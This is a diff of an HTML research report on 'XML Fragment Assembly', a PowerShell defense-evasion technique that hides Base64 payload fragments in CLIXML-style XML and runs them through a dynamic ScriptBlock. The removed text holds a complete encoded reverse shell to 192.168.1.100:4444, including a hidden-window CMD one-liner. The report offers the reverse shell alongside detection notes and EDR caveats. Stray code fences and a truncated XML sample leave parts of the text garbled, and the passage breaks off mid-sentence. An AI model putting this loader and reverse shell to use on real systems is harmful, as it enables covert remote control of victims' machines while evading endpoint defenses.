@@ -1,994 +1,680 @@
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>BoxStrike · XPath Fragment Assembly (XFA) – Technical Report</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XML Fragment Assembly (XFA) – Defense Evasion Research</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0b0e14;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            padding: 40px 20px;
         }
-
-```
-    body {
-        background: #f8fafc;
-        font-family: 'Georgia', 'Palatino', 'Times New Roman', serif;
-        color: #1a1a1a;
-        line-height: 1.6;
-        padding: 40px 20px;
-    }
-
-    .container {
-        max-width: 1000px;
-        margin: 0 auto;
-        background: #ffffff;
-        padding: 40px 50px 50px 50px;
-        box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
-        border-radius: 4px;
-    }
-
-    h1 {
-        font-size: 30px;
-        font-weight: 700;
-        color: #0b1e2e;
-        border-bottom: 2px solid #1a3a5a;
-        padding-bottom: 10px;
-        margin-bottom: 6px;
-    }
-
-    .subhead {
-        font-size: 17px;
-        color: #2a4a6a;
-        font-style: italic;
-        border-left: 4px solid #2a6a9a;
-        padding: 12px 20px;
-        background: #f4f7fa;
-        margin-bottom: 28px;
-        border-radius: 0 4px 4px 0;
-    }
-
-    .meta-info {
-        font-size: 15px;
-        color: #3a4a5a;
-        margin-top: -8px;
-        margin-bottom: 22px;
-        display: flex;
-        flex-wrap: wrap;
-        gap: 8px 24px;
-    }
-
-    .meta-info span {
-        background: #f0f2f5;
-        padding: 2px 14px;
-        border-radius: 20px;
-    }
-
-    h2 {
-        font-size: 23px;
-        font-weight: 700;
-        color: #0b1e2e;
-        margin-top: 34px;
-        margin-bottom: 12px;
-        border-bottom: 1px solid #d8dee6;
-        padding-bottom: 5px;
-    }
-
-    h3 {
-        font-size: 19px;
-        font-weight: 600;
-        color: #1a3a5a;
-        margin-top: 24px;
-        margin-bottom: 8px;
-    }
-
-    p {
-        margin-bottom: 14px;
-        text-align: justify;
-    }
-
-    ul,
-    ol {
-        margin: 8px 0 16px 28px;
-    }
-
-    li {
-        margin-bottom: 5px;
-    }
-
-    .note {
-        background: #f4f7fa;
-        border-left: 5px solid #2a6a9a;
-        padding: 14px 20px;
-        margin: 18px 0;
-        font-size: 15px;
-        border-radius: 0 4px 4px 0;
-    }
-
-    .warning {
-        background: #fef7e0;
-        border-left: 5px solid #b98a2b;
-        padding: 14px 20px;
-        margin: 18px 0;
-        font-size: 15px;
-        border-radius: 0 4px 4px 0;
-    }
-
-    code {
-        font-family: 'Consolas', 'Courier New', monospace;
-        font-size: 14px;
-        background: #edf0f4;
-        padding: 1px 7px;
-        border-radius: 3px;
-    }
-
-    pre {
-        background: #f4f6f8;
-        border: 1px solid #d0d8e0;
-        padding: 16px 20px;
-        overflow-x: auto;
-        font-family: 'Consolas', 'Courier New', monospace;
-        font-size: 13px;
-        line-height: 1.5;
-        margin: 16px 0;
-        border-radius: 4px;
-    }
-
-    table {
-        width: 100%;
-        border-collapse: collapse;
-        margin: 18px 0;
-        font-size: 15px;
-    }
-
-    th,
-    td {
-        border: 1px solid #c8d0d8;
-        padding: 8px 14px;
-        text-align: left;
-        vertical-align: top;
-    }
-
-    th {
-        background: #e8ecf2;
-        font-weight: 600;
-    }
-
-    .footer {
-        margin-top: 40px;
-        padding-top: 18px;
-        border-top: 1px solid #d8dee6;
-        font-size: 14px;
-        color: #4a5a6a;
-        display: flex;
-        justify-content: space-between;
-        flex-wrap: wrap;
-    }
-
-    @media (max-width: 700px) {
-        .container {
-            padding: 20px;
+        .report {
+            max-width: 1200px;
+            width: 100%;
+            background: #f5f7fc;
+            border-radius: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
+            padding: 50px 60px;
+            color: #1e293b;
+            line-height: 1.6;
         }
-
-        h1 {
-            font-size: 24px;
+        .header {
+            border-bottom: 3px solid #0f2b4b;
+            padding-bottom: 25px;
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            flex-wrap: wrap;
         }
-
-        pre {
-            font-size: 12px;
-            padding: 12px;
+        .header h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #0a1e3c, #1e4a7a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.1;
         }
-
-        .meta-info {
-            flex-direction: column;
-            gap: 4px;
+        .header .sub {
+            font-size: 1.1rem;
+            color: #2c3e5a;
+            background: #dce3ef;
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-weight: 500;
         }
-    }
-</style>
-```
-
+        .meta {
+            display: flex;
+            justify-content: space-between;
+            background: #e9edf6;
+            padding: 14px 24px;
+            border-radius: 16px;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            gap: 10px 20px;
+            font-weight: 500;
+            color: #1e3a5f;
+        }
+        .meta span { background: white; padding: 4px 16px; border-radius: 30px; }
+        h2 {
+            font-size: 1.9rem;
+            margin-top: 40px;
+            margin-bottom: 18px;
+            font-weight: 600;
+            color: #0a1e3c;
+            border-left: 8px solid #1e4a7a;
+            padding-left: 20px;
+        }
+        h3 {
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 12px;
+            font-weight: 600;
+            color: #1e3a5f;
+        }
+        h4 {
+            font-size: 1.1rem;
+            margin: 20px 0 8px;
+            font-weight: 600;
+            color: #1e3a5f;
+        }
+        p, li { margin-bottom: 12px; color: #1e293b; }
+        ul, ol { padding-left: 28px; margin-bottom: 18px; }
+        .code-block {
+            background: #0d1117;
+            color: #e6edf3;
+            padding: 20px 24px;
+            border-radius: 16px;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 0.85rem;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            margin: 20px 0;
+            border: 1px solid #2d3a4f;
+        }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin: 25px 0;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 20px 25px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+            border: 1px solid #e2e8f0;
+        }
+        .card h4 { margin-top: 0; }
+        .card-full {
+            background: white;
+            border-radius: 20px;
+            padding: 20px 25px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+            border: 1px solid #e2e8f0;
+            margin: 25px 0;
+        }
+        .card-full h4 { margin-top: 0; }
+        .diagram {
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 25px 20px;
+            margin: 30px 0;
+            border: 1px solid #dce3ef;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.04);
+            text-align: center;
+        }
+        .diagram svg { max-width: 100%; height: auto; }
+        .signature {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 2px solid #cbd5e1;
+            font-style: italic;
+            color: #2c3e5a;
+            text-align: right;
+            font-size: 1.1rem;
+        }
+        .signature strong { font-style: normal; color: #0a1e3c; }
+        .note-box {
+            background: #fef7e0;
+            border-left: 5px solid #b98a2b;
+            padding: 14px 20px;
+            margin: 18px 0;
+            font-size: 15px;
+            border-radius: 0 4px 4px 0;
+        }
+        .info-box {
+            background: #e8f0f8;
+            border-left: 5px solid #1e4a7a;
+            padding: 14px 20px;
+            margin: 18px 0;
+            font-size: 15px;
+            border-radius: 0 4px 4px 0;
+        }
+        @media (max-width: 800px) {
+            .report { padding: 30px 20px; }
+            .header h1 { font-size: 2rem; }
+            .grid-2 { grid-template-columns: 1fr; }
+        }
+    </style>
 </head>
-
 <body>
-<div class="container">
+<div class="report">
 
-```
-<h1>BoxStrike · Technical Report</h1>
+    <!-- HEADER -->
+    <div class="header">
+        <h1>XML Fragment Assembly<br><span style="font-size:1.6rem; background:none; -webkit-text-fill-color:#1e3a5f;">XFA – Defense Evasion Research</span></h1>
+        <div class="sub">BoxStrike Research</div>
+    </div>
 
-<div class="subhead">
-    <strong>XPath Fragment Assembly (XFA)</strong> – A PowerShell/XML-Based
-    Payload Assembly and Defense Evasion Technique
-</div>
+    <div class="meta">
+        <span>Published: 7 August 2026</span>
+        <span>Research Duration: 1 day</span>
+        <span>Author: Ensan Erdoğan Karaca</span>
+        <span>Classification: Public</span>
+    </div>
 
-<div class="meta-info">
-    <span><strong>Published:</strong> 9 August 2026</span>
-    <span><strong>Author:</strong> BoxStrike Research</span>
-    <span><strong>Version:</strong> 1.5</span>
-    <span><strong>Classification:</strong> Public</span>
-</div>
+    <!-- Summary -->
+    <p style="font-size:1.15rem; background:#e9edf6; padding:18px 24px; border-radius:20px; font-weight:500;">
+        <strong>Summary:</strong> This research investigates a technique where encoded payload data
+        is stored inside an XML structure and reconstructed during PowerShell execution
+        without invoking CLIXML deserialization in the primary variants. The method uses
+        PowerShell's XML parsing capabilities (<code>[xml]</code> + property traversal)
+        to extract embedded fragments, concatenate them, decode the Base64 data, and
+        execute the resulting PowerShell content dynamically. The research distinguishes
+        between XML parsing and CLIXML deserialization, and does not claim universal EDR
+        bypass — detection depends on product, configuration, and telemetry.
+    </p>
 
-<h2>1. Executive Summary</h2>
+    <!-- 1. Introduction -->
+    <h2>1. Introduction & Motivation</h2>
+    <p>
+        Modern security products, especially EDR (Endpoint Detection and Response) solutions,
+        rely on a combination of signature-based and behavioural analysis to detect threats.
+        PowerShell is one of the most heavily monitored tools. Commands such as
+        <code>Invoke-Expression</code>, <code>IEX</code>, and CLIXML deserialisation calls
+        like <code>ConvertFrom-CliXml</code> are often considered high-risk.
+    </p>
+    <p>
+        This research examines whether encoded data stored in an XML document can be
+        extracted and executed using only XML parsing, intentionally avoiding PowerShell's
+        CLIXML deserialization mechanisms. The goal is to document a potential behavioural
+        pattern that may be relevant for both offensive and defensive security research.
+    </p>
+    <div class="info-box">
+        <strong>Research scope:</strong> This report focuses on the mechanism of
+        storing and reassembling encoded data via XML parsing. It does not claim to
+        bypass any specific security product. Detection outcomes depend on the
+        EDR/AV product version, configuration, logging settings, and telemetry sources.
+    </div>
 
-<p>
-    This report documents <strong>XPath Fragment Assembly (XFA)</strong>,
-    a PowerShell-based execution pattern that uses native XML parsing,
-    structured XML objects, in-memory payload reconstruction, and dynamic
-    PowerShell execution.
-</p>
+    <!-- 2. The Core: CLIXML and XML Parsing -->
+    <h2>2. The Core: CLIXML and XML Parsing</h2>
+    <p>
+        PowerShell uses CLIXML as an XML-based representation for serialized PowerShell
+        objects. CLIXML can contain object type information, properties, and serialized values.
+        The format is used extensively in PowerShell Remoting, Hyper-V, and various
+        administrative tasks.
+    </p>
+    <p>
+        CLIXML deserialization and ordinary XML parsing are two distinct operations.
+        PowerShell provides mechanisms such as <code>ConvertFrom-CliXml</code> and
+        <code>[System.Management.Automation.PSSerializer]::Deserialize()</code> to
+        reconstruct serialized PowerShell objects.
+    </p>
+    <p>
+        The first two PoC variants investigated in this report intentionally do not use
+        those deserialization mechanisms. Instead, the document is loaded as an XML
+        document using <code>[xml]</code>, after which the embedded elements are accessed
+        as XML data.
+    </p>
 
-<p>
-    The technique is designed around a simple concept: payload data is
-    represented inside an XML structure rather than being presented directly
-    as executable PowerShell source. The XML document is parsed by PowerShell,
-    the relevant data is extracted from the resulting object structure,
-    reconstructed in memory, decoded, and finally passed to a dynamically
-    created PowerShell <code>ScriptBlock</code>.
-</p>
+    <h3>2.1 Serialization Versus Parsing</h3>
+    <p>
+        The presence of CLIXML-like elements such as <code>&lt;Objs&gt;</code>,
+        <code>&lt;Obj&gt;</code>, <code>&lt;TN&gt;</code>, and <code>&lt;S&gt;</code>
+        does not by itself mean that PowerShell has deserialized the document.
+    </p>
+    <p>
+        This distinction is central to the research: the PoC demonstrates that data
+        contained in an XML document can be extracted and reconstructed without invoking
+        the CLIXML object reconstruction mechanism.
+    </p>
 
-<p>
-    From an offensive perspective, this provides an alternative payload
-    representation in which the initial content presented to a security
-    product may primarily resemble structured XML and ordinary PowerShell
-    object handling rather than a directly visible command.
-</p>
+    <h3>2.2 XML Property Traversal vs XPath</h3>
+    <p>
+        In PowerShell, <code>$xml.Objs.Obj.S</code> is <strong>not</strong> an XPath query.
+        It is PowerShell's property traversal syntax, which accesses properties of the
+        underlying XML object model.
+    </p>
+    <p>
+        For reference, a genuine XPath query would use <code>SelectNodes()</code> or
+        <code>SelectSingleNode()</code> with an XPath expression, for example:
+    </p>
+    <div class="code-block">
+$nodes = $xml.SelectNodes("//S")
+    </div>
+    <p>
+        The PoCs in this research use property traversal because it is simpler and
+        does not require additional XPath syntax. The name <strong>XML Fragment
+        Assembly (XFA)</strong> reflects the XML-based storage and fragment
+        reconstruction mechanism, not the use of XPath specifically.
+    </p>
 
-<p>
-    From a defensive perspective, the important characteristic is not any
-    individual XML or Base64 operation. The security-relevant behaviour is
-    the complete sequence of XML parsing, payload extraction, reconstruction,
-    decoding, and dynamic execution.
-</p>
+    <!-- 3. Methodology -->
+    <h2>3. Methodology</h2>
+    <p>
+        The XML Fragment Assembly concept consists of storing encoded payload data
+        inside an XML structure and reconstructing that data through PowerShell's XML
+        handling capabilities. The important distinction is that the first two PoC
+        variants do not invoke PowerShell CLIXML deserialization; they parse the XML
+        as an XML document and access the embedded string data directly.
+    </p>
+    <ul>
+        <li>The payload is Base64-encoded (used as encoding/obfuscation, not encryption).</li>
+        <li>The encoded representation may be divided into multiple fragments.</li>
+        <li>The fragments are stored inside <code>&lt;S&gt;</code> elements.</li>
+        <li>The XML document is parsed by PowerShell using <code>[xml]</code>.</li>
+        <li>The embedded values are retrieved via property traversal and concatenated.</li>
+        <li>The resulting Base64 data is decoded into the original command text.</li>
+        <li>The resulting text is converted into a <code>ScriptBlock</code> for execution.</li>
+    </ul>
+    <p>
+        In PoC 1 and PoC 2, the XML is processed through the PowerShell XML type
+        accelerator (<code>[xml]</code>). No call to <code>ConvertFrom-CliXml</code> or
+        <code>PSSerializer.Deserialize()</code> is made in these variants.
+    </p>
+    <p>
+        Base64 is used here as an <strong>encoding and obfuscation layer</strong>
+        rather than encryption, because the data is merely transformed into a
+        different representation, not cryptographically secured.
+    </p>
 
-<div class="note">
-    <strong>Research scope:</strong>
-    XFA is presented as a research term describing this execution pattern.
-    The existence of the technique does not by itself demonstrate universal
-    EDR/AV bypass. Detection effectiveness must be evaluated experimentally
-    against individual products, configurations, logging policies, and
-    PowerShell versions.
-</div>
+    <!-- 4. Proof of Concept -->
+    <h2>4. Proof of Concept (PoC)</h2>
+    <p>
+        Three PoC variants are presented below. The first stores the XML <strong>on disk</strong>,
+        the second embeds it <strong>directly in the script</strong> (here-string, no deserialisation),
+        and the third uses PowerShell 7.5's <strong>ConvertFrom-CliXml</strong> cmdlet as
+        a comparison with CLIXML deserialization.
+    </p>
 
-<h2>2. Introduction</h2>
+    <h3>4.1 Test Payload</h3>
+    <p>
+        To demonstrate the mechanism without including a dangerous reverse shell in the
+        core PoC, the following harmless MessageBox payload is used:
+    </p>
+    <div class="code-block">
+$testPayload = 'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("XFA PoC - Data reassembled successfully", "XFA Test")'
+$base64Test = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($testPayload))
+# This Base64 string is then embedded in the XML fragments.
+    </div>
+    <p>
+        The same mechanism works with any payload, including reverse shells. A reverse
+        shell variant is provided in the appendix.
+    </p>
 
-<p>
-    PowerShell provides a number of native capabilities that are routinely
-    used for legitimate administration, automation, configuration management,
-    and system scripting. XML parsing is one such capability and is commonly
-    encountered in administrative workflows.
-</p>
+    <div class="grid-2">
+        <!-- PoC 1 - XML on Disk -->
+        <div class="card">
+            <h4>PoC 1 – XML on Disk</h4>
+            <p><strong>payload.xml</strong> (with MessageBox fragments)</p>
+            <div class="code-block">
+&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
+  &lt;Obj&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;
+  &lt;S&gt;QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtczsgW&lt;/S&gt;
+&lt;/Objs&gt;
+            </div>
+            <p><strong>Executor script:</strong></p>
+            <div class="code-block">
+# Read the XML file
+$xml = [xml](Get-Content -Path "payload.xml" -Raw)
 
-<p>
-    XFA investigates how these legitimate capabilities can be chained together
-    to transport and reconstruct executable PowerShell content at runtime.
-    The method does not depend on PowerShell deserialisation mechanisms such as
-    <code>ConvertFrom-CliXml</code> or
-    <code>PSSerializer.Deserialize</code>. Instead, the XML document is
-    interpreted through PowerShell's native XML object representation.
-</p>
+# Access all &lt;S&gt; elements via property traversal
+$segments = $xml.Objs.Obj.S
 
-<p>
-    This distinction is important because the technique does not require an
-    attacker to rely on PowerShell object deserialisation in order to obtain
-    the payload from XML. The XML acts as a container and representation layer,
-    while the final execution occurs after the payload has been reconstructed
-    in memory.
-</p>
-
-<h2>3. Attack Chain</h2>
-
-<p>
-    The complete XFA execution chain can be represented as follows:
-</p>
-
-<pre>
-```
-
-Payload preparation
-│
-▼
-Payload encoding
-│
-▼
-XML embedding
-│
-▼
-XML delivery
-│
-▼
-PowerShell XML parsing
-│
-▼
-XML object/property extraction
-│
-▼
-Payload reconstruction
-│
-▼
-Decoding
-│
-▼
-Dynamic ScriptBlock creation
-│
-▼
-PowerShell execution </pre>
-
-```
-<h3>3.1. Stage 1 – Payload Preparation</h3>
-
-<p>
-    The attacker begins with a PowerShell command or script that represents
-    the desired post-delivery action. Instead of presenting this source
-    directly, the payload is transformed into a representation that can be
-    stored inside the XML structure.
-</p>
-
-<p>
-    This separation creates two conceptual layers: the transport/container
-    representation and the final executable PowerShell representation.
-</p>
-
-<h3>3.2. Stage 2 – XML Embedding</h3>
-
-<p>
-    The encoded payload is placed inside an XML document using a
-    <code>&lt;S&gt;</code> element within a CLIXML-style structure.
-</p>
-
-<p>
-    The XML structure provides a legitimate serialization-like appearance
-    while allowing the payload to remain separate from the surrounding
-    PowerShell execution logic.
-</p>
-
-<h3>3.3. Stage 3 – Delivery</h3>
-
-<p>
-    An attacker could deliver the XML representation through several
-    mechanisms, including a file, embedded script content, a downloaded
-    resource, or another application-controlled data channel.
-</p>
-
-<p>
-    The technique itself is independent of the initial delivery mechanism.
-    Its relevant property begins when PowerShell receives and processes the
-    XML representation.
-</p>
-
-<h3>3.4. Stage 4 – XML Parsing</h3>
-
-<p>
-    PowerShell converts the XML document into an XML object using the native
-    <code>[xml]</code> type conversion mechanism.
-</p>
-
-<p>
-    The resulting object exposes the XML hierarchy through PowerShell's
-    object/property navigation. The relevant <code>&lt;S&gt;</code> elements
-    can consequently be accessed without invoking PowerShell's XML
-    deserialisation functionality.
-</p>
-
-<h3>3.5. Stage 5 – Payload Extraction and Assembly</h3>
-
-<p>
-    The extracted XML data is treated as the payload representation and
-    reconstructed in memory.
-</p>
-
-<p>
-    In a fragmented implementation, multiple XML nodes can represent
-    consecutive portions of the encoded payload. These values can be
-    concatenated before decoding. In the PoC presented in this report,
-    the payload is represented by a complete XML element.
-</p>
-
-<h3>3.6. Stage 6 – Decoding</h3>
-
-<p>
-    After the payload representation has been reconstructed, the encoded
-    content is decoded into its PowerShell source representation.
-</p>
-
-<p>
-    This stage is important from a defensive perspective because it creates
-    a transition from an apparently structured data representation to
-    executable script content.
-</p>
-
-<h3>3.7. Stage 7 – Dynamic Execution</h3>
-
-<p>
-    The resulting PowerShell source is passed to
-    <code>[scriptblock]::Create()</code> and subsequently invoked.
-</p>
-
-<p>
-    At this point, the execution chain has transitioned from XML data
-    processing into dynamic PowerShell execution.
-</p>
-
-<h2>4. Why the Technique Is Security-Relevant</h2>
-
-<p>
-    The security relevance of XFA originates from the difference between
-    the representation of the payload during the initial processing stages
-    and the representation that ultimately reaches the execution stage.
-</p>
-
-<p>
-    A security product may observe XML parsing, object navigation, string
-    handling, and other operations that individually have legitimate
-    administrative uses. The final malicious intent may only become apparent
-    after several operations have been chained together.
-</p>
-
-<p>
-    Therefore, an effective detection strategy should not necessarily treat
-    XML parsing itself as malicious. Instead, defenders can correlate the
-    following behavioural sequence:
-</p>
-
-<pre>
-```
-
-XML parsing
-+
-XML payload extraction
-+
-encoded data processing
-+
-dynamic ScriptBlock creation
-+
-PowerShell execution </pre>
-
-```
-<p>
-    The presence of this sequence can provide a stronger behavioural signal
-    than any individual operation in isolation.
-</p>
-
-<h2>5. Why Avoid Deserialisation?</h2>
-
-<p>
-    Traditional PowerShell XML workflows may involve mechanisms such as
-    <code>ConvertFrom-CliXml</code> or
-    <code>PSSerializer.Deserialize</code>. XFA deliberately does not depend
-    on those mechanisms.
-</p>
-
-<p>
-    Instead, the XML is treated as ordinary structured data and parsed using
-    PowerShell's native XML support. The payload is then extracted from the
-    resulting object structure and processed separately.
-</p>
-
-<p>
-    This distinction matters because defensive controls may monitor
-    deserialisation-specific behaviours independently from ordinary XML
-    parsing. XFA therefore investigates whether an equivalent payload
-    reconstruction workflow can be achieved without relying on those
-    deserialisation primitives.
-</p>
-
-<h2>6. Proof of Concept</h2>
-
-<p>
-    The following PoC demonstrates the complete execution chain described
-    above. The PoC uses an XML container, extracts the embedded payload,
-    reconstructs it in memory, decodes it, and passes the resulting PowerShell
-    source to a dynamically created <code>ScriptBlock</code>.
-</p>
-
-<p>
-    <strong>The PoC code is reproduced without modification.</strong>
-    The purpose of this section is to document the implementation used for
-    the research rather than to introduce a separate implementation.
-</p>
-
-<h3>6.1. XML Payload (Embedded Here-String)</h3>
-
-<pre>
-```
-
-$xmlPayload = @'
-<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
-<Obj><TN><T>System.String</T></TN>
-<S>JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC4xLjEwMCcsNDQ0NCk7CiRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOwpbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07CndoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7CiAgICAkZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTsKICAgICRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOwogICAgJHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgJHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTsKICAgICRzdHJlYW0uRmx1c2goKQp9OwokY2xpZW50LkNsb3NlKCk=</S>
-</Objs>
-'@ </pre>
-
-```
-<h3>6.2. Execution Script (XPath, No Deserialisation)</h3>
-
-<pre>
-```
-
-# Parse XML (no deserialisation)
-
-$xml = [xml]$xmlPayload
-
-# Extract all fragments via XPath
-
-$fragments = $xml.Objs.Obj.S
-
-# Concatenate and decode
-
-$combinedBase64 = $fragments -join ''
-$fullCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($combinedBase64))
+# Concatenate and decode Base64
+$combined = $segments -join ''
+$command = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($combined))
 
 # Execute
-
-& ([scriptblock]::Create($fullCommand)) </pre>
-
-```
-<h3>6.3. One-Liner for CMD</h3>
-
-<pre>
-```
-
-powershell -nop -w hidden -c "$x=[xml]@'<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04\"><Obj><TN><T>System.String</T></TN><S>JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC4xLjEwMCcsNDQ0NCk7CiRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOwpbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07CndoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7CiAgICAkZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTsKICAgICRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOwogICAgJHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgJHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTsKICAgICRzdHJlYW0uRmx1c2goKQp9OwokY2xpZW50LkNsb3NlKCk=</S></Obj></Objs>'@;$f=$x.Objs.Obj.S -join '';$c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($f));&([scriptblock]::Create($c))" </pre>
-
-```
-<h2>7. Attack Scenario</h2>
-
-<p>
-    A practical XFA attack chain can begin with an attacker gaining an
-    execution opportunity on a Windows endpoint. The initial access mechanism
-    is independent of XFA and may include a malicious document, script,
-    compromised software, user-assisted execution, or another execution
-    primitive.
-</p>
-
-<p>
-    Once PowerShell execution is available, the attacker can introduce the
-    XML representation containing the encoded payload. The XML content itself
-    can appear structurally similar to legitimate XML or CLIXML-style data.
-</p>
-
-<p>
-    PowerShell then parses the XML and accesses the relevant nodes. The
-    payload is reconstructed in memory and decoded before being passed to
-    <code>ScriptBlock::Create()</code>.
-</p>
-
-<p>
-    From an attack-chain perspective, XFA therefore operates primarily as a
-    <strong>payload representation and execution layer</strong>. It does not
-    define how the attacker initially compromises the host, nor does it
-    determine the final objective of the payload.
-</p>
-
-<h3>7.1. Example Attack Flow</h3>
-
-<pre>
-```
-
-Initial Access
-│
-▼
-PowerShell Execution
-│
-▼
-XML Payload Introduction
-│
-▼
-[xml] Parsing
-│
-▼
-Payload Extraction
-│
-▼
-In-Memory Reconstruction
-│
-▼
-Decode
-│
-▼
-ScriptBlock Creation
-│
-▼
-Payload Execution
-│
-├──────────────► Command Execution
-├──────────────► Credential Access
-├──────────────► Discovery
-├──────────────► Persistence
-└──────────────► Additional Payload Delivery </pre>
-
-```
-<h2>8. Defensive Evasion Characteristics</h2>
-
-<h3>8.1. Separation Between Container and Payload</h3>
-
-<p>
-    The XML representation separates the executable content from the initial
-    PowerShell logic responsible for processing it. This can make the first
-    representation of the payload substantially different from the final
-    command that executes.
-</p>
-
-<h3>8.2. Legitimate Native Functionality</h3>
-
-<p>
-    XFA relies on functionality that is normally available on Windows systems
-    running PowerShell. XML parsing, object navigation, string handling, and
-    dynamic PowerShell execution are not inherently malicious.
-</p>
-
-<p>
-    This creates an important detection challenge: individual events may have
-    legitimate explanations even when the complete sequence forms part of a
-    malicious execution chain.
-</p>
-
-<h3>8.3. In-Memory Reconstruction</h3>
-
-<p>
-    The payload is reconstructed after the XML has been parsed and processed.
-    The final PowerShell source therefore does not need to appear as a
-    contiguous block in the original XML representation.
-</p>
-
-<h3>8.4. Reduced Dependence on Deserialisation</h3>
-
-<p>
-    The technique does not require PowerShell's deserialisation primitives.
-    This allows the research to investigate a different telemetry path from
-    techniques that depend directly on <code>ConvertFrom-CliXml</code> or
-    <code>PSSerializer.Deserialize</code>.
-</p>
-
-<h2>9. Detection Considerations</h2>
-
-<p>
-    XFA should be detected through behavioural correlation rather than by
-    relying exclusively on a single indicator.
-</p>
-
-<table>
-    <thead>
-        <tr>
-            <th>Behaviour</th>
-            <th>Potential Detection Value</th>
-        </tr>
-    </thead>
-    <tbody>
-        <tr>
-            <td>PowerShell XML parsing</td>
-            <td>Low by itself because XML processing is common administrative behaviour.</td>
-        </tr>
-        <tr>
-            <td>Access to XML payload nodes</td>
-            <td>Potentially useful when combined with subsequent decoding and execution.</td>
-        </tr>
-        <tr>
-            <td>Encoded payload processing</td>
-            <td>Useful as a contextual signal, particularly when followed by dynamic execution.</td>
-        </tr>
-        <tr>
-            <td>Dynamic ScriptBlock creation</td>
-            <td>High-value behavioural signal when correlated with preceding payload reconstruction.</td>
-        </tr>
-        <tr>
-            <td>PowerShell execution after reconstruction</td>
-            <td>Strong correlation point for endpoint detection systems.</td>
-        </tr>
-    </tbody>
-</table>
-
-<h3>9.1. PowerShell Telemetry</h3>
-
-<p>
-    PowerShell ScriptBlock logging can provide visibility into dynamically
-    generated script content depending on the PowerShell version and logging
-    configuration.
-</p>
-
-<p>
-    Consequently, XFA should not be considered inherently invisible to
-    PowerShell telemetry. The method instead represents a change in how the
-    payload is represented before execution.
-</p>
-
-<h3>9.2. AMSI and Endpoint Telemetry</h3>
-
-<p>
-    AMSI and endpoint security products may observe PowerShell execution at
-    different stages of the attack chain. The effectiveness of XFA therefore
